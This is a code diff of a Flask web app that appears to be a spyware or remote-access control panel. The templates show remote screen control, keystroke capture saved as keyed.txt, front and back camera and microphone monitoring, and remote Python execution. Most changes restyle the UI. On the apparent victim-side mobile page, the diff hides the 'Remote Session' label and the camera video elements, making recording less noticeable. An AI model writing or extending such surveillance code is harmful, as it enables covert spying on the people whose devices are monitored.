@@ -512,7 +512,11 @@ HTML = r"""
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <style>
+    <style id="siteStyles" media="{{ 'all' if design else 'not all' }}">
+        [hidden] {
+            display: none !important;
+        }
+
         * {
             box-sizing: border-box;
         }
@@ -783,22 +787,6 @@ HTML = r"""
             white-space: nowrap;
         }
 
-        .level-track {
-            margin-top: 12px;
-            height: 10px;
-            background: #120a10;
-            border: 1px solid #4a2140;
-            border-radius: 5px;
-            overflow: hidden;
-        }
-
-        .level-fill {
-            height: 100%;
-            width: 0;
-            background: #d9488f;
-            transition: width 120ms linear;
-        }
-
         .panel-header {
             display: flex;
             flex-wrap: wrap;
@@ -1050,21 +1038,6 @@ HTML = r"""
             box-shadow: none;
         }
 
-        .toast-progress {
-            position: absolute;
-            left: 0;
-            bottom: 0;
-            height: 2px;
-            width: 100%;
-            background: currentColor;
-            transform-origin: left;
-        }
-
-        .toast.info    .toast-progress { color: #ffa8d4; }
-        .toast.success .toast-progress { color: #ff7ab8; }
-        .toast.warn    .toast-progress { color: #f2b05e; }
-        .toast.error   .toast-progress { color: #ff5f7e; }
-
         @keyframes toast-in {
             to {
                 opacity: 1;
@@ -1081,11 +1054,6 @@ HTML = r"""
                 opacity: 0;
                 transform: translateX(60%);
             }
-        }
-
-        @keyframes toast-progress {
-            from { transform: scaleX(1); }
-            to { transform: scaleX(0); }
         }
 
         /* ---------- LOG DRAWER ---------- */
@@ -2138,170 +2106,6 @@ HTML = r"""
             filter: hue-rotate(95deg) saturate(1.75) brightness(0.72) contrast(1.3);
         }
 
-        /* ---------- NO-DESIGN MODE (design command, default off) ---------- */
-
-        /* Design off means a bare HTML page: no author colors, so the
-           browser supplies its own defaults. Everything starts at the
-           top left. */
-
-        html.plain-ui {
-            filter: none !important;
-        }
-
-        html.plain-ui body,
-        html.plain-ui body * {
-            background-color: revert !important;
-            background-image: none !important;
-            color: revert !important;
-            border-color: revert !important;
-            border-radius: 0 !important;
-            box-shadow: none !important;
-            text-shadow: none !important;
-            backdrop-filter: none !important;
-            filter: none !important;
-            animation: none !important;
-            transition: none !important;
-            font-family: revert !important;
-            letter-spacing: normal !important;
-            text-transform: none !important;
-        }
-
-        html.plain-ui body {
-            margin: 8px !important;
-            padding: 0 !important;
-        }
-
-        html.plain-ui *::before,
-        html.plain-ui *::after {
-            content: none !important;
-            display: none !important;
-        }
-
-        html.plain-ui .app-shell,
-        html.plain-ui .connect-shell {
-            display: block !important;
-            gap: 0 !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .connect-view,
-        html.plain-ui .connect-card {
-            display: block !important;
-            min-height: 0 !important;
-            width: auto !important;
-            max-width: none !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            border: 0 !important;
-            background: transparent !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .sidebar {
-            position: static !important;
-            display: block !important;
-            width: auto !important;
-            height: auto !important;
-            max-height: none !important;
-            padding: 0 !important;
-            margin: 0 0 8px !important;
-            border: 0 !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .sidebar-brand,
-        html.plain-ui .nav-label {
-            display: none !important;
-        }
-
-        html.plain-ui .function-nav,
-        html.plain-ui .sidebar-bottom,
-        html.plain-ui .nav-list {
-            display: block !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            border: 0 !important;
-            list-style: none !important;
-        }
-
-        html.plain-ui .nav-list li {
-            display: inline !important;
-            margin: 0 !important;
-            padding: 0 !important;
-        }
-
-        html.plain-ui .nav-item {
-            display: inline !important;
-            width: auto !important;
-            margin: 0 10px 0 0 !important;
-            padding: 0 !important;
-            border: 0 !important;
-            background: none !important;
-            color: LinkText !important;
-            font: inherit !important;
-            text-decoration: underline !important;
-        }
-
-        html.plain-ui .nav-item.active {
-            color: VisitedText !important;
-            font-weight: normal !important;
-        }
-
-        html.plain-ui .main {
-            display: block !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            border: 0 !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .main-head {
-            display: block !important;
-            padding: 0 !important;
-            margin: 0 0 8px !important;
-            border: 0 !important;
-        }
-
-        html.plain-ui .main-head h1 {
-            display: inline !important;
-            margin: 0 8px 0 0 !important;
-            padding: 0 !important;
-            font-size: 2em !important;
-            font-weight: bold !important;
-        }
-
-        html.plain-ui .main-head-right {
-            display: inline !important;
-            margin: 0 !important;
-            padding: 0 !important;
-        }
-
-        html.plain-ui .panel,
-        html.plain-ui .view {
-            padding: 0 !important;
-            margin: 0 !important;
-            border: 0 !important;
-        }
-
-        html.plain-ui button,
-        html.plain-ui input,
-        html.plain-ui textarea,
-        html.plain-ui select {
-            padding: 1px 4px !important;
-            font: inherit !important;
-        }
-
-        html.plain-ui img,
-        html.plain-ui video,
-        html.plain-ui canvas {
-            background: transparent !important;
-        }
-
-        html.plain-ui body [hidden] {
-            display: none !important;
-        }
 
         html.fx-mirror { transform: scaleX(-1); }
 
@@ -2467,7 +2271,7 @@ HTML = r"""
 
     <div class="live-screen-head">
 
-        <div style="display:flex;align-items:center;gap:10px;">
+        <div>
             <span id="liveScreenStatus" class="live-badge" aria-live="polite">
                 <span class="dot"></span>
                 <span id="liveScreenStatusText">Minimized</span>
@@ -2477,10 +2281,10 @@ HTML = r"""
 
     </div>
 
-    <div id="liveStage" class="live-stage minimized">
+    <div id="liveStage" class="live-stage minimized" hidden>
 
         <div class="live-view">
-            <img id="liveScreenImage" alt="Live remote screen">
+            <img id="liveScreenImage" alt="Live remote screen" hidden>
         </div>
 
         <div class="live-scan"></div>
@@ -2503,7 +2307,7 @@ HTML = r"""
         <button class="key-download" onclick="downloadKeyLog()" title="Download the captured keys as keyed.txt">Download</button>
     </div>
 
-    <div id="liveKeyboard" class="live-keyboard">
+    <div id="liveKeyboard" class="live-keyboard" hidden>
         <div class="live-kb-row">
             <button class="kb-key" data-key="Escape">Esc</button>
             <button class="kb-key" data-key="F1">F1</button>
@@ -2617,7 +2421,7 @@ HTML = r"""
         No screenshot requested.
     </p>
 
-    <img id="screenshot" style="display:none;">
+    <img id="screenshot" hidden>
 
 </section>
 
@@ -2634,7 +2438,7 @@ HTML = r"""
         Screen share is off.
     </p>
 
-    <img id="streamImage" style="display:none;">
+    <img id="streamImage" hidden>
 
 </section>
 
@@ -2651,9 +2455,7 @@ HTML = r"""
         Microphone is off.
     </p>
 
-    <div class="level-track">
-        <div id="micLevel" class="level-fill"></div>
-    </div>
+    <progress id="micLevel" max="100" value="0"></progress>
 
 </section>
 
@@ -2677,15 +2479,15 @@ HTML = r"""
 
     <div class="camera-grid">
         <figure>
-            <img id="cameraImage" alt="Back camera" style="display:none;">
+            <img id="cameraImage" alt="Back camera" hidden>
             <figcaption>Back camera</figcaption>
         </figure>
         <figure>
-            <img id="cameraImageFront" alt="Front camera" style="display:none;">
+            <img id="cameraImageFront" alt="Front camera" hidden>
             <figcaption>Front camera</figcaption>
         </figure>
         <figure>
-            <img id="cameraSnapshotImage" alt="Single frame" style="display:none;">
+            <img id="cameraSnapshotImage" alt="Single frame" hidden>
             <figcaption>Single frame</figcaption>
         </figure>
     </div>
@@ -2743,7 +2545,7 @@ HTML = r"""
         No code has been run.
     </p>
 
-    <pre class="output" id="pythonOutput" style="display:none;"></pre>
+    <pre class="output" id="pythonOutput" hidden></pre>
 
 </section>
 
@@ -3260,21 +3062,13 @@ function showToast(message, type = "info", title = "") {
     close.setAttribute("aria-label", "Dismiss notification");
     close.onclick = () => dismissToast(toast);
 
-    const progress = document.createElement("div");
-
-    progress.className = "toast-progress";
-
     const life =
         type === "error" ? 7000 :
         type === "warn" ? 5500 : 4200;
 
-    progress.style.animation =
-        "toast-progress " + life + "ms linear forwards";
-
     toast.appendChild(heading);
     toast.appendChild(body);
     toast.appendChild(close);
-    toast.appendChild(progress);
 
     stack.appendChild(toast);
 
@@ -3303,8 +3097,6 @@ function showToast(message, type = "info", title = "") {
 
         active.remaining -=
             Date.now() - active.startedAt;
-
-        progress.style.animationPlayState = "paused";
     });
 
     toast.addEventListener("mouseleave", () => {
@@ -3316,8 +3108,6 @@ function showToast(message, type = "info", title = "") {
         }
 
         active.startedAt = Date.now();
-
-        progress.style.animationPlayState = "running";
 
         active.timer = setTimeout(
             () => dismissToast(toast),
@@ -3501,10 +3291,10 @@ async function disconnectComputer(reason) {
 
     document.getElementById("fileStatus").textContent = "";
 
-    document.getElementById("screenshot").style.display = "none";
-    document.getElementById("streamImage").style.display = "none";
-    document.getElementById("cameraImage").style.display = "none";
-    document.getElementById("cameraImageFront").style.display = "none";
+    document.getElementById("screenshot").hidden = true;
+    document.getElementById("streamImage").hidden = true;
+    document.getElementById("cameraImage").hidden = true;
+    document.getElementById("cameraImageFront").hidden = true;
 
     document.getElementById("streamButton").textContent =
         "Start Screen Share";
@@ -3518,7 +3308,7 @@ async function disconnectComputer(reason) {
     document.getElementById("micStatus").textContent =
         "Microphone is off.";
 
-    document.getElementById("micLevel").style.width = "0";
+    document.getElementById("micLevel").value = 0;
 
     document.getElementById("cameraButton").textContent =
         "Start Camera";
@@ -3559,6 +3349,26 @@ const SITE_EFFECT_NAMES = [
 ];
 
 
+const siteStyles = document.getElementById("siteStyles");
+
+
+function setSiteDesign(enabled) {
+
+    if (!siteStyles) {
+        return;
+    }
+
+    if (enabled) {
+        siteStyles.media = "all";
+        if (!siteStyles.isConnected) {
+            document.head.appendChild(siteStyles);
+        }
+    } else if (siteStyles.isConnected) {
+        siteStyles.remove();
+    }
+}
+
+
 function applySiteEffects(effects) {
 
     effects = effects || {};
@@ -3572,11 +3382,8 @@ function applySiteEffects(effects) {
         );
     }
 
-    // The design command defaults to off, so an absent flag means plain.
-    document.documentElement.classList.toggle(
-        "plain-ui",
-        !effects.design
-    );
+    // Design off means no CSS at all: the stylesheet is detached.
+    setSiteDesign(Boolean(effects.design));
 
     for (const name of SITE_EFFECT_NAMES) {
         document.body.classList.toggle(
@@ -4962,7 +4769,7 @@ async function requestScreenshot() {
                     encodeURIComponent(currentComputer) +
                     ".png?t=" + Date.now();
 
-                image.style.display = "block";
+                image.hidden = false;
 
                 status.textContent = "Screenshot received.";
 
@@ -5046,7 +4853,7 @@ async function startStream() {
         streamRunning = true;
 
         button.textContent = "Stop Screen Share";
-        image.style.display = "block";
+        image.hidden = false;
         status.textContent = "Waiting for the first frame...";
 
         logEvent(
@@ -5204,6 +5011,7 @@ function liveToggleMaximize() {
 
 function liveMaximize() {
     liveMaximized = true;
+    liveStage().hidden = false;
     liveStage().classList.remove("minimized");
     document.getElementById("liveModeBar").hidden = false;
     document.getElementById("liveToggleBtn").textContent = "Minimize";
@@ -5218,9 +5026,11 @@ function liveMaximize() {
 
 function liveMinimize() {
     liveMaximized = false;
+    liveStage().hidden = true;
     liveStage().classList.add("minimized");
     liveStage().classList.remove("visible", "has-frame");
     document.getElementById("liveModeBar").hidden = true;
+    document.getElementById("liveKeyboard").hidden = true;
     document.getElementById("liveKeyboard").classList.remove("visible");
     document.getElementById("liveKeysPanel").hidden = true;
     document.getElementById("liveToggleBtn").textContent = "Maximize";
@@ -5262,6 +5072,7 @@ async function liveScreenStart() {
     if (!liveMaximized) { liveScreenStop("left"); return; }
 
     liveRunning = true;
+    liveStage().hidden = false;
     liveStage().classList.add("visible");
     if (liveInputMode === "keys") startRemoteKeyFeed();
     livePollPreview(session);
@@ -5300,11 +5111,16 @@ function liveScreenReset() {
     capturedKeys = "";
     renderKeyLine();
     liveSetMode("keyboard");
+    liveStage().hidden = true;
     liveStage().classList.add("minimized");
     liveStage().classList.remove("visible", "has-frame");
     document.getElementById("liveModeBar").hidden = true;
+    document.getElementById("liveKeyboard").hidden = true;
     document.getElementById("liveKeyboard").classList.remove("visible");
     document.getElementById("liveKeysPanel").hidden = true;
+    const image = document.getElementById("liveScreenImage");
+    image.hidden = true;
+    image.removeAttribute("src");
     document.getElementById("liveToggleBtn").textContent = "Maximize";
     liveFrameComputer = "";
     liveScreenStop("reset");
@@ -5333,6 +5149,7 @@ async function livePollPreview(session) {
             if (liveObjectUrl) URL.revokeObjectURL(liveObjectUrl);
             liveObjectUrl = URL.createObjectURL(blob);
             image.src = liveObjectUrl;
+            image.hidden = false;
             liveFailures = 0;
             liveFrameComputer = name;
             if (!liveFrameReady) { liveFrameReady = true; stage.classList.add("has-frame"); }
@@ -5362,7 +5179,7 @@ async function livePollPreview(session) {
 function liveCoords(event) {
     const stage = liveStage();
     const image = document.getElementById("liveScreenImage");
-    const rect = stage.getBoundingClientRect();
+    const rect = image.getBoundingClientRect();
     const nw = image.naturalWidth || 16;
     const nh = image.naturalHeight || 9;
     const scale = Math.min(rect.width / nw, rect.height / nh);
@@ -5431,6 +5248,7 @@ async function liveScreenScroll(event) {
 
 
 function liveRipple(left, top) {
+    if (!siteStyles || !siteStyles.isConnected) return;
     const dot = document.createElement("span");
     dot.className = "live-ripple";
     dot.style.left = left + "px";
@@ -5495,10 +5313,10 @@ function liveSetMode(mode) {
     document.querySelectorAll(".live-mode-btn").forEach(function(btn) {
         btn.classList.toggle("active", btn.dataset.mode === liveInputMode);
     });
-    document.getElementById("liveKeyboard").classList.toggle(
-        "visible",
-        liveMaximized && liveInputMode === "keyboard"
-    );
+    const keyboard = document.getElementById("liveKeyboard");
+    const showKeyboard = liveMaximized && liveInputMode === "keyboard";
+    keyboard.hidden = !showKeyboard;
+    keyboard.classList.toggle("visible", showKeyboard);
     document.getElementById("liveKeysPanel").hidden =
         !(liveMaximized && liveInputMode === "keys");
     if (liveMaximized && liveInputMode === "keys") {
@@ -5772,7 +5590,7 @@ async function stopMicrophone() {
     button.textContent = "Start Listening";
     status.textContent = "Microphone is off.";
 
-    document.getElementById("micLevel").style.width = "0";
+    document.getElementById("micLevel").value = 0;
 
     if (micContext && micContext.state === "running") {
 
@@ -5895,7 +5713,7 @@ async function pollMicrophone() {
             document.getElementById("micButton").textContent =
                 "Start Listening";
 
-            level.style.width = "0";
+            level.value = 0;
             status.textContent =
                 "Microphone failed: " + data.error;
 
@@ -5916,7 +5734,7 @@ async function pollMicrophone() {
             document.getElementById("micButton").textContent =
                 "Start Listening";
 
-            level.style.width = "0";
+            level.value = 0;
             status.textContent =
                 "Microphone stopped on the computer.";
 
@@ -5936,8 +5754,8 @@ async function pollMicrophone() {
                 new Date().toLocaleTimeString();
         }
 
-        level.style.width =
-            Math.min(100, Math.round(peak * 160)) + "%";
+        level.value =
+            Math.min(100, Math.round(peak * 160));
 
     } catch (error) {
         console.error(error);
@@ -5988,7 +5806,7 @@ function resetSnapshot() {
     const image = document.getElementById("cameraSnapshotImage");
 
     if (image) {
-        image.style.display = "none";
+        image.hidden = true;
         image.removeAttribute("src");
     }
 
@@ -6090,7 +5908,7 @@ async function captureCameraFrame() {
 
         snapshotObjectUrl = URL.createObjectURL(blob);
         image.src = snapshotObjectUrl;
-        image.style.display = "block";
+        image.hidden = false;
 
         logEvent(
             "success",
@@ -6155,8 +5973,8 @@ async function startCamera() {
         cameraRunning = true;
 
         button.textContent = "Stop Camera";
-        cameraFeed("back").style.display = "none";
-        cameraFeed("front").style.display = "none";
+        cameraFeed("back").hidden = true;
+        cameraFeed("front").hidden = true;
         status.textContent = "Waiting for the camera...";
 
         logEvent(
@@ -6189,8 +6007,8 @@ function finishCameraStop(message) {
 
     document.getElementById("cameraButton").textContent = "Start Camera";
     document.getElementById("cameraStatus").textContent = message;
-    cameraFeed("back").style.display = "none";
-    cameraFeed("front").style.display = "none";
+    cameraFeed("back").hidden = true;
+    cameraFeed("front").hidden = true;
 
     revokeCameraFrames();
     resetSnapshot();
@@ -6214,8 +6032,8 @@ async function stopCamera() {
 
     button.textContent = "Start Camera";
     status.textContent = "Camera is off.";
-    cameraFeed("back").style.display = "none";
-    cameraFeed("front").style.display = "none";
+    cameraFeed("back").hidden = true;
+    cameraFeed("front").hidden = true;
 
     revokeCameraFrames();
     resetSnapshot();
@@ -6271,7 +6089,7 @@ async function pollCameraFeed(camera) {
 
             cameraObjectUrls[camera] = URL.createObjectURL(blob);
             image.src = cameraObjectUrls[camera];
-            image.style.display = "block";
+            image.hidden = false;
 
             return { live: true, error: "" };
         }
@@ -6515,7 +6333,7 @@ async function runPython() {
     }
 
     button.disabled = true;
-    output.style.display = "none";
+    output.hidden = true;
     output.textContent = "";
 
     status.textContent =
@@ -6544,7 +6362,7 @@ async function runPython() {
             "Finished with exit code " +
             result.exit_code + ".";
 
-        output.style.display = "block";
+        output.hidden = false;
         output.textContent = result.output
             ? result.output.replace(/\s+$/, "")
             : "(No output.)";
@@ -6620,6 +6438,7 @@ CONSOLE_HTML = r"""
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
+    {% if design %}
     <style>
         * {
             box-sizing: border-box;
@@ -6696,6 +6515,7 @@ CONSOLE_HTML = r"""
             color: #b98fa8;
         }
     </style>
+    {% endif %}
 </head>
 
 <body>
@@ -6985,6 +6805,7 @@ BLOCKED_HTML = r"""
     <title>spyware</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
+    {% if design %}
     <style>
         * {
             box-sizing: border-box;
@@ -7037,6 +6858,7 @@ BLOCKED_HTML = r"""
             color: #fff;
         }
     </style>
+    {% endif %}
 </head>
 
 <body>
@@ -7088,7 +6910,11 @@ MOBILE_HTML = r"""
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
 
-    <style>
+    <style id="siteStyles" media="{{ 'all' if design else 'not all' }}">
+        [hidden] {
+            display: none !important;
+        }
+
         * {
             box-sizing: border-box;
         }
@@ -7232,170 +7058,6 @@ MOBILE_HTML = r"""
             filter: hue-rotate(95deg) saturate(1.75) brightness(0.72) contrast(1.3);
         }
 
-        /* ---------- NO-DESIGN MODE (design command, default off) ---------- */
-
-        /* Design off means a bare HTML page: no author colors, so the
-           browser supplies its own defaults. Everything starts at the
-           top left. */
-
-        html.plain-ui {
-            filter: none !important;
-        }
-
-        html.plain-ui body,
-        html.plain-ui body * {
-            background-color: revert !important;
-            background-image: none !important;
-            color: revert !important;
-            border-color: revert !important;
-            border-radius: 0 !important;
-            box-shadow: none !important;
-            text-shadow: none !important;
-            backdrop-filter: none !important;
-            filter: none !important;
-            animation: none !important;
-            transition: none !important;
-            font-family: revert !important;
-            letter-spacing: normal !important;
-            text-transform: none !important;
-        }
-
-        html.plain-ui body {
-            margin: 8px !important;
-            padding: 0 !important;
-        }
-
-        html.plain-ui *::before,
-        html.plain-ui *::after {
-            content: none !important;
-            display: none !important;
-        }
-
-        html.plain-ui .app-shell,
-        html.plain-ui .connect-shell {
-            display: block !important;
-            gap: 0 !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .connect-view,
-        html.plain-ui .connect-card {
-            display: block !important;
-            min-height: 0 !important;
-            width: auto !important;
-            max-width: none !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            border: 0 !important;
-            background: transparent !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .sidebar {
-            position: static !important;
-            display: block !important;
-            width: auto !important;
-            height: auto !important;
-            max-height: none !important;
-            padding: 0 !important;
-            margin: 0 0 8px !important;
-            border: 0 !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .sidebar-brand,
-        html.plain-ui .nav-label {
-            display: none !important;
-        }
-
-        html.plain-ui .function-nav,
-        html.plain-ui .sidebar-bottom,
-        html.plain-ui .nav-list {
-            display: block !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            border: 0 !important;
-            list-style: none !important;
-        }
-
-        html.plain-ui .nav-list li {
-            display: inline !important;
-            margin: 0 !important;
-            padding: 0 !important;
-        }
-
-        html.plain-ui .nav-item {
-            display: inline !important;
-            width: auto !important;
-            margin: 0 10px 0 0 !important;
-            padding: 0 !important;
-            border: 0 !important;
-            background: none !important;
-            color: LinkText !important;
-            font: inherit !important;
-            text-decoration: underline !important;
-        }
-
-        html.plain-ui .nav-item.active {
-            color: VisitedText !important;
-            font-weight: normal !important;
-        }
-
-        html.plain-ui .main {
-            display: block !important;
-            padding: 0 !important;
-            margin: 0 !important;
-            border: 0 !important;
-            overflow: visible !important;
-        }
-
-        html.plain-ui .main-head {
-            display: block !important;
-            padding: 0 !important;
-            margin: 0 0 8px !important;
-            border: 0 !important;
-        }
-
-        html.plain-ui .main-head h1 {
-            display: inline !important;
-            margin: 0 8px 0 0 !important;
-            padding: 0 !important;
-            font-size: 2em !important;
-            font-weight: bold !important;
-        }
-
-        html.plain-ui .main-head-right {
-            display: inline !important;
-            margin: 0 !important;
-            padding: 0 !important;
-        }
-
-        html.plain-ui .panel,
-        html.plain-ui .view {
-            padding: 0 !important;
-            margin: 0 !important;
-            border: 0 !important;
-        }
-
-        html.plain-ui button,
-        html.plain-ui input,
-        html.plain-ui textarea,
-        html.plain-ui select {
-            padding: 1px 4px !important;
-            font: inherit !important;
-        }
-
-        html.plain-ui img,
-        html.plain-ui video,
-        html.plain-ui canvas {
-            background: transparent !important;
-        }
-
-        html.plain-ui body [hidden] {
-            display: none !important;
-        }
 
         html.fx-mirror { transform: scaleX(-1); }
 
@@ -7466,7 +7128,7 @@ MOBILE_HTML = r"""
 <div class="scanlines"></div>
 
 <header>
-    <div class="brand"><span class="dot"></span> Remote Session</div>
+    <div class="brand" hidden><span class="dot"></span> Remote Session</div>
     <button class="leave" id="leaveButton">Stop sharing</button>
 </header>
 
@@ -7481,8 +7143,8 @@ MOBILE_HTML = r"""
     <button id="bannerPick">Choose pictures</button>
 </div>
 
-<video id="preview" class="ghost-media" playsinline autoplay muted></video>
-<video id="previewFront" class="ghost-media" playsinline autoplay muted></video>
+<video id="preview" class="ghost-media" playsinline autoplay muted hidden></video>
+<video id="previewFront" class="ghost-media" playsinline autoplay muted hidden></video>
 <div id="log" hidden></div>
 <input id="photoInput" type="file" accept="image/*" multiple hidden>
 
@@ -7548,6 +7210,26 @@ const SITE_EFFECT_NAMES = [
 ];
 
 
+const siteStyles = document.getElementById("siteStyles");
+
+
+function setSiteDesign(enabled) {
+
+    if (!siteStyles) {
+        return;
+    }
+
+    if (enabled) {
+        siteStyles.media = "all";
+        if (!siteStyles.isConnected) {
+            document.head.appendChild(siteStyles);
+        }
+    } else if (siteStyles.isConnected) {
+        siteStyles.remove();
+    }
+}
+
+
 function applySiteEffects(effects) {
 
     effects = effects || {};
@@ -7561,11 +7243,8 @@ function applySiteEffects(effects) {
         );
     }
 
-    // The design command defaults to off, so an absent flag means plain.
-    document.documentElement.classList.toggle(
-        "plain-ui",
-        !effects.design
-    );
+    // Design off means no CSS at all: the stylesheet is detached.
+    setSiteDesign(Boolean(effects.design));
 
     for (const name of SITE_EFFECT_NAMES) {
         document.body.classList.toggle(
@@ -7829,6 +7508,7 @@ async function sendSingleFrame(requestId) {
     let temporary = null;
     const video = document.createElement("video");
     video.className = "ghost-media";
+    video.hidden = true;
     video.muted = true;
     video.playsInline = true;
     document.body.appendChild(video);
@@ -8484,7 +8164,8 @@ def enforce_website_blocks():
             render_template_string(
                 BLOCKED_HTML,
                 remaining=remaining,
-                permanent=permanent
+                permanent=permanent,
+                design=bool(current_site_effects().get("design"))
             ),
             403
         )
@@ -9093,7 +8774,7 @@ WEBSITE_HELP = (
     "                             yellow, dark, light, mono, hacker,\n"
     "                             default\n"
     "design <user|all> true|false Website design on/off\n"
-    "                             (default off = plain console look)\n"
+    "                             (default off = no CSS at all)\n"
     "dyslexic <user|all> true|false   Dyslexic text styling\n"
     "flip <user|all> true|false       Turn the page upside down\n"
     "mirror <user|all> true|false     Mirror the page\n"
@@ -9281,7 +8962,10 @@ def favicon():
 @app.route("/")
 @require_auth
 def dashboard():
-    return render_template_string(HTML)
+    return render_template_string(
+        HTML,
+        design=bool(current_site_effects().get("design"))
+    )
 
 
 # ==================================================
@@ -9305,7 +8989,8 @@ def console_page():
 
     return render_template_string(
         CONSOLE_HTML,
-        name=name
+        name=name,
+        design=bool(current_site_effects().get("design"))
     )
 
 
@@ -10973,7 +10658,10 @@ def camera_snapshot(request_id):
 @app.route("/mobile")
 @require_auth
 def mobile_page():
-    return render_template_string(MOBILE_HTML)
+    return render_template_string(
+        MOBILE_HTML,
+        design=bool(current_site_effects().get("design"))
+    )
 
 
 @app.route("/api/mobile/register", methods=["POST"])
